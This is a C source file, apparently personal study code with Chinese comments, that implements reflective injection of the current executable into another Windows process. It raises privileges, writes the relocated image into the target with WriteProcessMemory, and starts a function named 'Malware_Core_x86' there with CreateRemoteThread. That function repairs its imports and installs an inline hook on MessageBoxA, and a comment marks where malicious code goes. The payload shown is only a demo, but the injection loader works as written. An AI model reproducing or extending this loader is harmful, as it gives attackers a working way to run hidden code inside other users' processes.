// -------------------------------------------------------------------
//反射式注入只能注入自己EXE当前模块，不能注入DLL
//	因为被注入的模块需要自己修复IAT表，而修复IAT表所需的参数较多，
//	如果事先将所需参数全部写入目标进程太麻烦了（参数是结构体，结构体中又包含指针数组，
//	所以只写入结构体是不够的，还需要把里面的指针数组所指向的所有数据一并写入，还要考虑写入后的地址偏移）。
//
// Copyright (c) LiSheDaChun. All rights reserved.
// -------------------------------------------------------------------

#include "stdafx.h"

// <summary>
// Malware所需的全局变量参数
// </summary>
MALWARE_PARAM malware_Param;

// <summary>
// 为malware全局参数赋值
// </summary>
// <param name="PEBody"></param>
// <param name="virtualAddr"></param>
VOID Malware_HandleParam(PEBody PEBody, DWORD virtualAddr)
{
	//判断原定的数组大小是否足够
	if (PEBody.NumberOfImportDirectory > 100)
	{
		printf("错误:NumberOfImportDirectory大于100 \n");
		return;
	}
	for (int i = 0; i < PEBody.NumberOfImportDirectory; i++)
	{
		if (PEBody.INT_Table[i].NumberOfItem > 200)
		{
			printf("错误:NumberOfImportDirectory大于200 \n");
			return;
		}
	}
	//开始赋值
	malware_Param.virtualAddr = virtualAddr;
	malware_Param.numOfImportDirectory = PEBody.NumberOfImportDirectory;
	for (int i = 0; i < PEBody.NumberOfImportDirectory; i++)
	{
		malware_Param.ImportDirectory[i] = PEBody.ImportDirectory[i];
		malware_Param.INT_Malware[i].numOfItem_pri = PEBody.INT_Table[i].NumberOfItem;
		malware_Param.IAT_Malware[i].numOfItem_pri = PEBody.IAT_Table[i].NumberOfItem;
		for (int j = 0; j < PEBody.INT_Table[i].NumberOfItem; j++)
		{
			malware_Param.INT_Malware[i].IMAGE_THUNK_DATA[j] = (DWORD)PEBody.INT_Table[i].IMAGE_THUNK_DATA[j];
			malware_Param.IAT_Malware[i].funcAddr[j] = (DWORD)PEBody.IAT_Table[i].funcAddress[j];
		}
	}
}

// <summary>
// 为malware修复IAT表
//（因为原先malloc的PEBody无法粘贴至目标进程，所以将PEBody复制到全局变量中）
// </summary>
VOID Malware_RepairIAT_x86()
{
	OutputDebugString("my-开始修复IAT表...\n");
	for (int i = 0; i < malware_Param.numOfImportDirectory; i++)
	{
		//DLL名称字符串
		CHAR* dllName = (CHAR*)(malware_Param.virtualAddr + malware_Param.ImportDirectory[i].Name);
		for (int j = 0; j < malware_Param.INT_Malware[i].numOfItem_pri; j++)
		{
			//加载DLL并根据函数名称/序号获取函数地址
			DWORD funcAddr = 0;
			if (malware_Param.INT_Malware[i].IMAGE_THUNK_DATA[j] & 0x80000000)/////////////
			{//若其二进制最高位=1，则是按序号导入
				WORD funcOrdinal = malware_Param.INT_Malware[i].IMAGE_THUNK_DATA[j] & 0x0000FFFF;//只要后16位
				funcAddr = (DWORD)GetProcAddress(LoadLibrary(dllName), (LPSTR)funcOrdinal);
			}
			else
			{//若其二进制最高位=0，则是按名称导入
				CHAR* funcName = (CHAR*)(malware_Param.virtualAddr + malware_Param.INT_Malware[i].IMAGE_THUNK_DATA[j] + 0x2);//只要后16位
				funcAddr = (DWORD)GetProcAddress(LoadLibrary(dllName), funcName);
			}
			//将函数地址写入PEBody结构体
			malware_Param.IAT_Malware[i].funcAddr[j] = funcAddr;
			//将函数地址写入IAT表 (ImageBuffer中)
			*(DWORD*)(malware_Param.virtualAddr + malware_Param.ImportDirectory[i].FirstThunk + j * 0x4) = funcAddr;
		}
	}
	ShowDbg("my-修复IAT表完毕", 0x6636);
}

// <summary>
// 在目标进程中执行的恶意代码(要负责修复IAT表)
// </summary>
// <param name="NULL"></param>
DWORD WINAPI Malware_Core_x86(LPVOID lpThreadParameter)
{
	OutputDebugString("my-进入目标进程");

	//修复IAT表 (需在调用外部DLL函数之前修复)
	Malware_RepairIAT_x86();

	//这里填写恶意代码，可以开线程
	MODULEINFO moduleInfo;
	GetModuleInformation(GetCurrentProcess(), GetModuleHandle(NULL), OUT &moduleInfo, sizeof(MODULEINFO));//得到进程句柄
	MessageBox(0, "已注入完毕...", 0, 0);

	//创建一个控制台窗口
	AllocConsole();
	freopen("conout$", "w", stdout);
	printf("hello wolrd!\n");

	//测试：IATHook
	//Hook_IATHook_x86(TEXT("USER32.dll"), TEXT("MessageBoxA"), (DWORD)Hook_IATHook_MyMessageBox_X86);

	//测试：InlineHook
	InlineHook_X86(TEXT("USER32.dll"), TEXT("MessageBoxA"), (DWORD)InlineHook_MyMessageBoxA_X86, 5);
	//InlineHook_X86(TEXT("d3d11.dll"), TEXT("D3D11CreateDevice"), (DWORD)InlineHook_MyMessageBoxA_X86, 5);

	return 0;
}

// <summary>
// 反射式注入当前模块 (X86)
// </summary>
// <param name="destPID">目标进程ID</param>
VOID ReflectInject_X86(CHAR* processName)
{
#if _DEBUG
	printf("错误：需编译为release版本... \n");
	return;
#endif
#if !MY_X86
	printf("错误：需编译为X86... \n");
	return;
#endif
	printf("\n开始执行反射式注入... \n");

	//0.提权,才能打开一些进程
	if (!upPrivileges())
	{
		return;
	}

	//1.得到当前模块的镜像大小ImageSize、镜像基址ImageBase
	MODULEINFO moduleInfo;
	GetModuleInformation(GetCurrentProcess(), GetModuleHandle(NULL), OUT &moduleInfo, sizeof(MODULEINFO));
	printf("当前模块基址=%08X \n", moduleInfo.lpBaseOfDll);

	//2.将当前模块复制到缓冲区ImageBuffer
	PBYTE imageBuffer = (PBYTE)malloc(moduleInfo.SizeOfImage);
	memcpy(imageBuffer, moduleInfo.lpBaseOfDll, moduleInfo.SizeOfImage);

	//3.分析当前模块的PE结构
	PEBody PEBody;
	PEHeader PEHeader;
	//PBYTE fileBuffer;
	//TCHAR filePath[MAX_PATH] = { 0 };
	//GetModuleFileName(NULL, OUT filePath, MAX_PATH); //得到当前模块路径
	//readPEFile(filePath, OUT &fileBuffer);
	//AnalyzePE_FileBuffer_x86(fileBuffer, &PEHeader, &PEBody);
	AnalyzePE_ImageBuffer_x86((PBYTE)imageBuffer, &PEHeader, &PEBody);


	//4.打开目标进程：读/写权限、操作权限(用于申请虚拟内存)
	HANDLE hDestProcess = MyOpenProcess_x86(processName, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION);
	if (hDestProcess == 0x0)return;

	//5.申请一块足够粘贴当前模块大小的虚拟内存VirtualMemory
	DWORD virtualAddr = (DWORD)VirtualAllocEx(hDestProcess, NULL, moduleInfo.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (virtualAddr == 0x0)
	{
		printf("申请内存失败，code=%d \n", GetLastError());
		return;
	}

	//6.根据申请到的基址，修复当前模块重定位表（编译成release版本才有重定位表）
	if (!RepairReLocationDirectory_x86(virtualAddr, (DWORD)moduleInfo.lpBaseOfDll, imageBuffer, &PEHeader, &PEBody))
	{
		return;
	}

	//7.1 为恶意函数所需的参数赋值，参数必须是【全局变量】(传递的参数中如果存在写死的指针值，则需要手动重定位)
	Malware_HandleParam(PEBody, virtualAddr);

	//7.2 将参数更新至缓冲区ImageBuffer
	DWORD RVA_MalwareParam = (DWORD)&malware_Param - (DWORD)moduleInfo.lpBaseOfDll;
	memcpy(imageBuffer + RVA_MalwareParam, &malware_Param, sizeof(malware_Param));

	//8.将最终的imageBuffer贴入目标进程虚拟内存
	WriteProcessMemory(hDestProcess, (LPVOID)virtualAddr, imageBuffer, moduleInfo.SizeOfImage, NULL);

	//9.计算Malware函数在目标进程中的地址
	DWORD RVA = (DWORD)Malware_Core_x86 - (DWORD)moduleInfo.lpBaseOfDll;
	LPTHREAD_START_ROUTINE pMALWAREFUNC = (LPTHREAD_START_ROUTINE)(virtualAddr + RVA);

	//10.调用远程线程执行Malware函数
	HANDLE hRemoteThread = CreateRemoteThread(hDestProcess, NULL, 0, pMALWAREFUNC, NULL, 0, OUT NULL);
	printf("开启远程线程,句柄=%x \n", hRemoteThread);
}